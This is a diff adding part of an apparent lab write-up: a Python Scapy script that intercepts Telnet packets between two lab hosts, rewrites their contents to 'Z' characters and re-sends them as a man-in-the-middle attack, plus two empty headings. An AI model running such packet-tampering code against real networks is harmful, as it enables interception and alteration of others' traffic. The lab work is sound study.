@@ -112,3 +112,53 @@ while True:
        time.sleep(5) 
 ```
 
+### With IP Forwarding Enabled
+
+
+### With IP Forwarding Disabled
+
+
+Launching an  MitM Attack on Telnet
+```
+#!/usr/bin/env python3
+from scapy.all import *
+# https://docs.python.org/3/library/re.html [regular expressions]
+import re
+
+# Set the target IP addresses
+target_a_ip = '10.9.0.5'
+target_b_ip = '10.9.0.6'
+
+# Set the MAC addresses for Hosts A, B, and M
+host_a_mac = '02:42:0a:09:00:05'
+host_b_mac = '02:42:0a:09:00:06'
+host_m_mac = '02:42:0a:09:00:69'
+
+# Define the Telnet data modification function
+def modify_telnet_data(pkt):
+    print("Nigel is launching an MitM Attack on Telnet")
+    if IP in pkt and TCP in pkt and pkt[IP].src == target_a_ip and pkt[IP].dst == target_b_ip:
+        # Extract the Telnet data from the TCP packet
+        telnet_data = pkt[TCP].payload.load.decode(errors='ignore')
+
+        # Replace each character in the Telnet data with the fixed character (Z in this case)
+        # The standard library ‘re’ module provides regular expression matching operations
+        telnet_data = re.sub('.', 'Z', telnet_data)
+
+        # Recalculate the TCP checksum and update the packet
+        del pkt[IP].chksum
+        del pkt[TCP].chksum
+        pkt[TCP].payload = telnet_data.encode()
+        pkt[TCP].len = len(pkt[TCP].payload)
+
+        # Send the modified packet to Host B
+        sendp(pkt, iface='eth0')
+
+# Set up a packet capture filter to capture only Telnet traffic from Host A to Host B
+filter_str = 'tcp and src host {} and dst host {} and dst port 23'.format(target_a_ip, target_b_ip)
+
+# Start the packet capture and modification loop
+sniff(prn=modify_telnet_data, filter=filter_str, store=0)
+```
+
+Thank you to my followers.
